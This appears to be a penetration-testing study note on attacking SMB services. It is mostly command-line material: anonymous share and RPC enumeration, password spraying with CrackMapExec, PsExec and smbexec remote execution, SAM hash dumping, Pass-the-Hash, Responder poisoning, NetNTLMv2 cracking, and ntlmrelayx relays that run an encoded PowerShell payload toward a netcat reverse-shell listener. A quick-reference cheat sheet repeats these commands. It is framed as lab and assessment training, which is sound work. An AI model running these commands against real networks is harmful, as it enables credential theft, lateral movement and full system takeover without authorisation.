# Attacking Common Services - Attacking SMB

## Overview

**Server Message Block (SMB)** is a network communication protocol used to provide shared access to:

- files
- folders
- printers
- named pipes
- other network resources

Historically, SMB ran over **NetBIOS over TCP/IP** using:

- **TCP 139**
- **UDP 137**
- **UDP 138**

Modern Windows systems typically use **SMB directly over TCP 445**, without needing the NetBIOS layer, although NetBIOS support may still exist for compatibility or failover.

### Related Technologies

#### Samba
**Samba** is the open-source Unix/Linux implementation of SMB.  
It allows Linux and Unix systems to provide SMB services to Windows and other clients.

#### MSRPC
**MSRPC (Microsoft Remote Procedure Call)** is commonly seen alongside SMB.  
It allows remote procedure execution and often uses **SMB named pipes** as its transport.

This matters because attacking SMB often means attacking not just file shares, but also:

- RPC interfaces
- authentication flows
- remote administration mechanisms
- Windows internals exposed over the network

---

## Why SMB Matters in an Assessment

SMB is one of the most useful services you can find in an internal environment.

Depending on the target and your privileges, SMB can provide:

- file share access
- anonymous share enumeration
- username discovery
- group discovery
- password policy information
- command execution
- SAM hash dumping
- logged-on user enumeration
- Pass-the-Hash opportunities
- credential capture and relay opportunities

In short, SMB is often both an **enumeration goldmine** and a **lateral movement path**.

---

# Ports and Protocol Behaviour

## Common SMB-Related Ports

| Port | Protocol | Purpose |
|---|---|---|
| 139 | TCP | SMB over NetBIOS |
| 445 | TCP | SMB directly over TCP/IP |
| 137 | UDP | NetBIOS Name Service |
| 138 | UDP | NetBIOS Datagram Service |

### Practical Meaning

- If you see **445 only**, the host is likely using direct SMB over TCP
- If you see **139 and 445**, NetBIOS support is probably enabled
- On Linux targets running Samba, you may see behaviour slightly different from Windows hosts
- RPC activity may also appear over SMB named pipes after initial access

---

# Enumeration

## Basic Nmap Scan

Start with:

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

### What this does

- `-sV` performs service/version detection
- `-sC` runs default NSE scripts
- `-p139,445` targets the main SMB ports

---

## Example Output

```text
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

### Important Findings Here

- **Samba smbd 4.6.2** reveals a Linux/Unix SMB implementation
- **NetBIOS name: HTB**
- **SMB signing enabled but not required**

### Why “signing enabled but not required” matters

That usually means SMB signing is supported but not enforced.  
In some situations, this can open the door to:

- NTLM relay attacks
- weaker integrity guarantees
- easier credential abuse

---

## What Nmap Can and Cannot Tell You

When scanning **Windows** targets, Nmap often does **not** reveal exact Windows versions via SMB.  
Instead, it may:

- guess the OS
- provide SMB dialect details
- expose hostname/workgroup/domain data
- reveal signing configuration

Because of this, you often need **additional enumeration** to decide whether a host is vulnerable to a specific SMB exploit.

---

# Misconfigurations

## Anonymous Authentication / Null Session

A common SMB misconfiguration is allowing access without authentication.  
This is often called a **null session**.

With a null session, you may be able to enumerate:

- shares
- usernames
- groups
- password policy
- RPC information
- permissions
- workstation or domain details

---

## Enumerating Shares with smbclient

To list shares anonymously:

```bash
smbclient -N -L //10.129.14.128
```

### Explanation

- `-N` tells smbclient not to prompt for a password
- `-L` lists available shares

### Example Output

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
notes           Disk      CheckIT
IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

### What to look for

- custom shares like `notes`
- admin shares such as `ADMIN$` and `C$`
- `IPC$`, which is often useful for IPC/RPC communication

---

## Enumerating Share Permissions with smbmap

```bash
smbmap -H 10.129.14.128
```

### Example Output

```text
[+] IP: 10.129.14.128:445     Name: 10.129.14.128
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

### Why smbmap is useful

Unlike smbclient, `smbmap` shows **share permissions** clearly, which immediately tells you where you can:

- read files
- write files
- potentially upload payloads
- potentially stage scripts or exfiltrate data

---

## Recursively Browsing Shares

```bash
smbmap -H 10.129.14.128 -r notes
```

### Example Output

```text
[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

### Interesting things in this output

- `READ, WRITE` access is available
- there is a file called `note.txt`
- there is a `WindowsImageBackup` directory which may contain highly valuable backup material

---

## Downloading and Uploading with smbmap

### Download a file

```bash
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

### Upload a file

```bash
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

### Why this matters

If a share is writable, you may be able to:

- plant files
- alter scripts
- drop payloads
- tamper with operational data
- stage execution paths if another service consumes files from that share

---

# Remote Procedure Call (RPC)

## Why RPC Matters

SMB often exposes or transports access to **RPC services**.

This allows deeper enumeration or even system modification in some cases.

A useful tool here is:

```bash
rpcclient -U'%' 10.10.110.17
```

### Explanation

- `-U'%'` attempts null authentication
- once connected, you enter an interactive RPC shell

### Example command inside rpcclient

```text
enumdomusers
```

### Example Output

```text
user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

### Why this is useful

You now have:

- valid usernames
- RIDs
- likely service accounts
- likely spray targets
- naming convention clues

---

## enum4linux-ng

Another useful enumeration tool is `enum4linux-ng`, which automates many SMB/RPC checks.

```bash
./enum4linux-ng.py 10.10.11.45 -A -C
```

### What it can enumerate

- workgroup/domain name
- usernames
- groups
- OS details
- share information
- SMB dialect support
- password policy clues

### Why this is useful

It acts like a broad SMB triage tool.  
Good for quickly understanding what kind of SMB surface you are dealing with.

---

# Protocol-Specific Attacks

If null sessions are not available, you usually need credentials.

Two common paths are:

- brute force
- password spraying

---

# Brute Force and Password Spraying

## Brute Force

Brute force means trying many passwords against one account.

This is risky because it may:

- trigger account lockout
- generate alerts
- create noisy logs

In most real environments, brute forcing SMB accounts is not ideal.

---

## Password Spraying

Password spraying means trying **one common password** against **many usernames**.

This is generally safer and more realistic in enterprise environments.

A common tool for this is **CrackMapExec**.

### Example user list

```text
Administrator
jrodriguez
admin
jurena
```

### Example spray

```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

### Example Output

```text
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!)
```

### Notes

- `--local-auth` is needed when authenticating against a local machine account database rather than a domain
- by default, CME may stop on success
- `--continue-on-success` keeps spraying after a valid credential is found

### Why `Pwn3d!` matters

It indicates the credentials are valid **and** that the account likely has administrative rights on the target.

---

# SMB Attacks on Windows

Once valid credentials are found, Windows SMB opens a much larger attack surface than many Linux SMB targets.

If the compromised account has administrative rights, common follow-up actions include:

- remote command execution
- extracting SAM hashes
- enumerating logged-on users
- Pass-the-Hash
- credential relay or reuse

---

# Remote Code Execution (RCE)

## PsExec Concept

A classic Windows SMB execution path is **PsExec**.

The general idea is:

1. upload a service binary to a writable share like `ADMIN$`
2. use SMB/DCERPC to interact with the Service Control Manager
3. create and start a temporary service
4. use that service to run commands

This is why administrative rights are so powerful over SMB.

---

## Impacket PsExec

To get help:

```bash
impacket-psexec -h
```

To connect:

```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
```

### Example Output

```text
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
```

### Example post-access check

```cmd
whoami && hostname
```

### Example Result

```text
nt authority\system
WIN7BOX
```

### Why this matters

You are not merely authenticated.  
You now have **SYSTEM-level remote code execution**.

---

## Other Impacket Execution Tools

Impacket also includes:

- `impacket-smbexec`
- `impacket-atexec`

### Rough distinction

- **psexec**: classic service-based execution
- **smbexec**: similar idea but different implementation
- **atexec**: uses Task Scheduler

Each can work better or worse depending on host configuration and privileges.

---

## CrackMapExec Command Execution

Run a CMD command:

```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

Run a PowerShell command:

```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -X '$PSVersionTable'
```

### Why this is useful

CME is convenient because it can:

- execute across multiple hosts
- combine spraying and execution workflows
- make lateral movement much faster

---

# Enumerating Logged-On Users

If local admin credentials are reused across many systems, you can quickly identify where valuable users are logged in.

```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

### Why this matters

This helps identify:

- active user sessions
- admin presence
- lateral movement targets
- systems likely worth pivoting to next

If you find a domain admin logged onto a workstation you can access, that is a very high-value lead.

---

# Extracting Hashes from the SAM Database

## What SAM Is

The **SAM (Security Account Manager)** database stores local Windows account password hashes.

If you have administrative rights, you can dump those hashes for:

- password cracking
- credential reuse
- Pass-the-Hash
- offline analysis

### Example

```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

### Example Output

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

### Why this matters

Even if you do not know the plaintext password, the NT hash may still be enough to:

- authenticate elsewhere
- move laterally
- crack offline

---

# Pass-the-Hash (PtH)

## Overview

If you obtain an NTLM hash, you may be able to authenticate **without cracking it**.

This is called **Pass-the-Hash (PtH)**.

### Example with CrackMapExec

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

### Example Output

```text
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

### Why this matters

Plaintext is not required.  
The hash itself becomes the credential.

This is one of the reasons why NTLM material is so dangerous when exposed.

---

# Forced Authentication Attacks

## Overview

Sometimes, instead of attacking the SMB server directly, you attack **the client authentication process**.

The goal is to make a victim authenticate to **your** fake SMB server so you can capture or relay the credentials.

A common tool for this is **Responder**.

---

## Responder

Responder poisons:

- LLMNR
- NBT-NS
- mDNS

It listens for failed name resolution traffic and replies pretending to be the host the victim is trying to reach.

### Start Responder

```bash
sudo responder -I ens33
```

### What it does

If a victim mistypes a share like:

```text
\\mysharefoder\
```

instead of:

```text
\\mysharedfolder\
```

the victim machine may issue multicast name-resolution requests.

Responder replies first, tricks the victim into connecting, and captures:

- NetNTLMv1 hashes
- NetNTLMv2 hashes
- other protocol auth material depending on configuration

---

## Example Captured NetNTLMv2 Material

```text
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:...
```

### Why this matters

You may now be able to:

- crack the hash offline
- relay it to another host
- gain access without ever knowing the password initially

---

# Cracking NetNTLMv2

Use Hashcat mode **5600**.

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Example Result

```text
ADMINISTRATOR::WIN-487IMQOIA8E:...:P@ssword
```

### Why multiple hashes may appear for the same user

NetNTLMv2 includes randomized challenge material, so the captured strings differ between sessions even if the password is the same.

---

# NTLM Relay with ntlmrelayx

If cracking fails, relaying may still work.

## Preparation

Responder’s SMB server must be turned off in `Responder.conf`:

```text
SMB = Off
```

## Start ntlmrelayx

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

### What this can do

By default, it may:

- dump SAM
- run post-auth actions
- execute commands if configured with `-c`

### Example Command Execution

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64_payload>'
```

### Why this matters

If the victim authenticates to your relay and the target accepts the relayed auth, you may get:

- code execution
- SAM dumping
- SYSTEM shell
- privilege escalation without cracking anything

---

# Reverse Shell via Relay

A common relay follow-up is to run a PowerShell reverse shell payload.

You can listen with:

```bash
nc -lvnp 9001
```

If the relay succeeds, you may get a SYSTEM shell like:

```text
PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

---

# RPC Abuse Beyond Enumeration

If configuration allows it, RPC may support more than just enumeration.

Possible actions can include:

- changing a user’s password
- creating a new domain user
- creating a new share
- modifying certain attributes

Whether this is possible depends heavily on:

- privileges
- target role
- server configuration
- domain policy

RPC is powerful, but also highly context-dependent.

---

# Linux vs Windows SMB Targets

## Linux / Samba Targets

Common focus areas:

- share access
- file permissions
- writable shares
- Samba version vulnerabilities
- configuration issues

## Windows Targets

Common focus areas:

- admin shares
- credential attacks
- RCE paths
- SAM dumping
- logged-on user enumeration
- Pass-the-Hash
- relay opportunities
- RPC abuse

Windows generally presents the broader post-auth attack surface.

---

# Enumeration Priorities

When you find SMB, focus on the following:

1. **Ports 139 and 445**
2. **Implementation**  
   - Samba or Windows
3. **Signing configuration**
4. **Null session support**
5. **Accessible shares**
6. **Permissions**
7. **RPC enumeration**
8. **Valid usernames**
9. **Password spraying opportunities**
10. **Admin rights**
11. **Execution paths**
12. **Hash extraction / PtH opportunities**
13. **Relay opportunities**

---

# High-Value Findings

The following should immediately stand out:

- null session enabled
- readable or writable shares
- exposed backup folders
- `WindowsImageBackup`
- `IPC$` accessible
- username enumeration via RPC
- SMB signing not required
- successful password spray
- local admin reuse across hosts
- SAM hashes exposed
- NetNTLM capture opportunities
- relayable authentication
- SYSTEM-level remote execution

---

# Quick Commands

## Nmap

```bash
sudo nmap -sV -sC -p139,445 <target>
```

## smbclient

```bash
smbclient -N -L //<target>
smbclient //<target>/<share> -N
smbclient //<target>/<share> -U <user>%<password>
```

## smbmap

```bash
smbmap -H <target>
smbmap -H <target> -r <share>
smbmap -H <target> --download "<share>\<file>"
smbmap -H <target> --upload local.txt "<share>\remote.txt"
```

## rpcclient

```bash
rpcclient -U'%' <target>
```

Useful interactive RPC commands:

```text
enumdomusers
enumdomgroups
queryuser <RID>
```

## enum4linux-ng

```bash
./enum4linux-ng.py <target> -A -C
```

## CrackMapExec / NetExec style spraying

```bash
crackmapexec smb <target> -u users.txt -p 'Password123!' --local-auth
crackmapexec smb <target> -u <user> -p <pass> --shares
crackmapexec smb <subnet> -u <user> -p <pass> --loggedon-users
crackmapexec smb <target> -u <user> -p <pass> --sam
crackmapexec smb <target> -u <user> -H <nthash>
crackmapexec smb <target> -u <user> -p <pass> -x 'whoami' --exec-method smbexec
```

## Impacket Execution

```bash
impacket-psexec <user>:'<password>'@<target>
impacket-smbexec <user>:'<password>'@<target>
impacket-atexec <user>:'<password>'@<target>
```

## Responder

```bash
sudo responder -I <interface>
```

## Hashcat NetNTLMv2

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## ntlmrelayx

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target>
impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c '<command>'
```

---

# Key Takeaways

- SMB is one of the richest services to find during internal enumeration.
- Null sessions can expose huge amounts of information.
- Share permissions matter as much as share names.
- Samba and Windows SMB targets often require different follow-up logic.
- Password spraying over SMB is common and effective when done carefully.
- Administrative SMB access often leads directly to command execution.
- SAM dumping and Pass-the-Hash make SMB extremely powerful for lateral movement.
- Responder and ntlmrelayx can turn client-side mistakes into credential capture or code execution.
- SMB signing configuration is critical when thinking about relay attacks.
- Always treat SMB as both a **file access surface** and a **credential abuse surface**.

---

# Tags

#attacking-common-services  
#smb  
#samba  
#rpc  
#responder  
#ntlmrelayx  
#psexec  
#passthehash  
#hashes  
#enumeration  
#windows  
#linux  
#obsidian